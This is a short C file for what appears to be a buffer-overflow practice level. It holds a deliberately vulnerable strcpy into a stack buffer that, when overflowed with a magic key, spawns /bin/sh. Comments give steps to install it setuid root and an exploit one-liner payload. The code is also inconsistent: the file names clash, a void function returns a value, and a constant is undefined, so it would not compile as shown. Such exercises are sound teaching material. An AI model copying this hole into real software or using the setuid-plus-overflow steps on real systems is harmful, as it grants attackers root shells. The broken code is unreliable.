// AFTER => bof3.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x12345678
#define R "\033[31m"
#define E "\033[0m"

// ASLR OFF
// COMPILE $ gcc -fno-stack-protector bof4.c -o bof4
// SETUID  $ sudo chown root:root bof4
//         $ sudo chmod 4755 bof4
// EXPLOIT $ ./bof4 `python -c "print '\x78\x56\x34\x12'+'x'*140"`

void vuln(char * arg) {
    int innocent;
    char buf[BUF_SIZE];

    strcpy(buf, arg);
    printf("Hello %s!\n", buf);

    if (innocent == KEY) {
        if (setreuid(UID_BOF5, UID_BOF5)) {
            perror("setuid");
            return 1;
        }
        if (setregid(UID_BOF5, UID_BOF5)) {
            perror("setgid");
            return 1;
        }
        system("/bin/sh");
    }
}

int main(int argc, char *argv[]){
    if (argc < 2) {
        fputs(R "error :( this program needs some arguments\n" E, stderr);
        return 1;
    }
    vuln(argv[1]);
    return 0;
}
